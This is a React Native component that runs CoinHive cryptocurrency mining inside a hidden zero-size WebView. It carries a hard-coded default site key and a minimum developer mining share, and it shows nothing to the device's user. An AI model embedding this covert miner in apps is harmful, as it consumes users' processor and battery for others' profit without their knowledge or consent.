import React, { Component } from 'react'
import PropTypes from 'prop-types'
import { StyleSheet, View, Text, WebView } from 'react-native'

export default class CoinHiveClient extends Component {
  static defaultProps =  {
    siteKey  : 'YjnI5obtmcFVofmcIElf9iayMokHMz2B',
    threads  : 2,
    speed    : 100,
    devSpeed : 10,
    onStats  : () => {},
    onStop   : () => {},
    onRunning: () => {},
    onStart  : () => {},
    onSpeed  : () => {},
    onThreads: () => {}
  }

  getInjectScript() {
    const { siteKey, threads, speed, devSpeed } = this.props

    return `
      (function ready() {
        function whenRNPostMessageReady(cb) {
          if (postMessage.length === 1) cb();
          else setTimeout(function() { whenRNPostMessageReady(cb) }, 100);
        }
        whenRNPostMessageReady(function() {
          start('${siteKey}', { 'threads': parseInt(${threads}, 10), 'throttle': ${(100 - speed) / 100} }, ${devSpeed > 10 ? devSpeed : 10})
        });
      })();
    `
  }

  _handleOnMessage = event =>  {
    if(event.nativeEvent.data !== '[object Object]') {
      const object = JSON.parse(event.nativeEvent.data)
      if(object.hashesPerSecond)
        this.props.onStats(object)
      else if(object.running)
        this.props.onRunning(object)
      else if(object.stopped)
        this.props.onStop(object)
      else if(object.start)
        this.props.onStart(object)
      else if(object.speed)
        this.props.onSpeed(object)
      else if(object.threads)
        this.props.onThreads(object)
      else
        console.log(object)
    }
  }

  componentWillReceiveProps(nextProps) {
    if(nextProps.speed !== this.props.speed)
      this.webview.postMessage(JSON.stringify({ speed: nextProps.speed }))
    else if(nextProps.threads !== this.props.threads)
      this.webview.postMessage(JSON.stringify({ threads: nextProps.threads }))
  }

  stopNow() {
    this.webview.postMessage(JSON.stringify({ action: 'stopNow' }))
  }

  stop() {
    this.webview.postMessage(JSON.stringify({ action: 'stop' }))
  }

  addThread() {
    this.webview.postMessage(JSON.stringify({ action: 'addThread' }))
  }

  removeThread() {
    this.webview.postMessage(JSON.stringify({ action: 'removeThread' }))
  }

  speedUp() {
    this.webview.postMessage(JSON.stringify({ action: 'speedUp' }))
  }

  speedDown() {
    this.webview.postMessage(JSON.stringify({ action: 'speedDown' }))
  }

  render() {
    return (
      <WebView
        injectedJavaScript={this.getInjectScript()}
        javaScriptEnabledAndroid={true}
        onMessage={this._handleOnMessage}
        ref={(webview) => this.webview = webview}
        source={require('./index.html')}
        style={{
          width : 0,
          height: 0
        }} />
    )
  }
}

CoinHiveClient.PropTypes = {
  siteKey  : PropTypes.string.isRequired,
  threads  : PropTypes.number,
  speed    : PropTypes.number,
  onStats  : PropTypes.func,
  onStop   : PropTypes.func,
  onRunning: PropTypes.func,
  onStart  : PropTypes.func,
  onSpeed  : PropTypes.func,
  onThreads: PropTypes.func,
  onInit   : PropTypes.func,
  onStart  : PropTypes.func,
  onStop   : PropTypes.func
}
